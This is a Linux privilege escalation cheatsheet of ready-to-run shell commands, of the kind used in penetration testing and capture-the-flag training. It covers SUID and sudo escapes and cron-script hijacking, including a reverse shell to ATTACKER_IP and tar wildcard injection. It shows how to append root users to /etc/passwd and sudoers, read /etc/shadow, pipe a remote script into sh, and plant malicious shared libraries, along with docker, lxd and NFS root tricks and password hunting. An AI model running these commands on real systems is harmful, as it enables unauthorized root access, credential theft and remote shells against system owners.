# Linux Privilege Escalation Cheatsheet

## Initial Enumeration
```bash
# Current user and groups
id
whoami
groups

# System info
uname -a
cat /etc/os-release
cat /proc/version
hostname

# Other users
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/shadow  # Readable?
cat /etc/group

# Sudo permissions
sudo -l
sudo -V   # Sudo version (check for CVEs)

# Running processes
ps aux
ps -ef --forest

# Network
netstat -tulnp
ss -tulnp
ip addr
ip route
cat /etc/resolv.conf

# Installed packages
dpkg -l   # Debian/Ubuntu
rpm -qa   # RHEL/CentOS
```

## Automated Enumeration
```bash
# LinPEAS (comprehensive)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# Linux Smart Enumeration
./lse.sh -l 1

# pspy (process snooping without root)
./pspy64
```

## SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find both
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

# Check GTFOBins for each SUID binary
# https://gtfobins.github.io/

# Common SUID exploits
# nmap (old versions)
nmap --interactive
!sh

# find
find . -exec /bin/sh -p \;

# vim
vim -c ':!/bin/sh'

# python
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# bash
bash -p

# env
env /bin/sh -p

# cp (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
echo 'root2:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd
```

## Sudo Exploits
```bash
# Check sudo version (CVE-2021-3156: Baron Samedit, sudo < 1.9.5p2)
sudo -V

# Sudo rule exploitation
# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/bash

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash";'

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/ruby
sudo ruby -e 'exec "/bin/bash"'

# If sudo -l shows: (ALL) NOPASSWD: /usr/bin/nmap
sudo nmap --interactive  # Old versions
echo 'os.execute("/bin/sh")' > /tmp/nse.nse && sudo nmap --script=/tmp/nse.nse

# If sudo -l shows: env_keep+=LD_PRELOAD
# Compile: gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
# pe.c: void _init() { setuid(0); system("/bin/bash -p"); }
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>
```

## Cron Jobs
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/spool/cron/crontabs/*

# Check for writable scripts run by cron as root
# If a cron job runs /opt/backup.sh as root and you can write to it:
echo '#!/bin/bash' > /opt/backup.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

# PATH hijacking in cron
# If cron runs "backup" without full path and you can write to a PATH dir:
echo '#!/bin/bash' > /tmp/backup
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /tmp/backup
chmod +x /tmp/backup

# Wildcard injection (tar with *)
# If cron runs: tar czf /tmp/backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> shell.sh
```

## Capabilities
```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common capability exploits
# cap_setuid+ep on python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_setuid+ep on perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search on tar (read any file)
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz

# cap_net_raw on python3 (packet sniffing)
python3 -c 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW)'
```

## Writable Files and Directories
```bash
# World-writable files owned by root
find / -writable -type f -user root 2>/dev/null

# World-writable directories
find / -writable -type d 2>/dev/null

# Files you can write to
find / -writable -type f 2>/dev/null | grep -v proc

# Check /etc/passwd writable
ls -la /etc/passwd
# If writable, add root user:
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd

# Check /etc/shadow readable
ls -la /etc/shadow
# If readable, crack hashes with hashcat/john

# Writable /etc/sudoers
echo 'username ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

## Kernel Exploits
```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel <version> privilege escalation

# Common kernel exploits
# DirtyPipe (CVE-2022-0847) - Linux 5.8+
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 to 4.8.3
# PwnKit (CVE-2021-4034) - polkit pkexec
# Baron Samedit (CVE-2021-3156) - sudo < 1.9.5p2
# GameOver(lay) (CVE-2023-2640, CVE-2023-32629) - Ubuntu OverlayFS
```

## Miscellaneous Techniques
```bash
# Docker group (if user is in docker group)
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# LXD group
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# NFS no_root_squash
# On attacker: mount share, create SUID binary
showmount -e target_ip
mount -t nfs target_ip:/share /mnt
cp /bin/bash /mnt/bash
chmod +s /mnt/bash
# On target: /share/bash -p

# SSH keys
find / -name id_rsa 2>/dev/null
find / -name authorized_keys 2>/dev/null
ls -la /home/*/.ssh/

# Password hunting
grep -ri "password" /var/log/ 2>/dev/null
grep -ri "password" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name ".env" -type f 2>/dev/null
cat ~/.bash_history
cat ~/.mysql_history

# Shared library hijacking
# If a SUID binary loads a library from a writable path:
# 1. Identify with: strace <binary> 2>&1 | grep "open.*\.so"
# 2. Create malicious .so
# gcc -shared -fPIC -o /writable/path/lib.so evil.c
# evil.c: void __attribute__((constructor)) init() { setuid(0); system("/bin/bash -p"); }
```
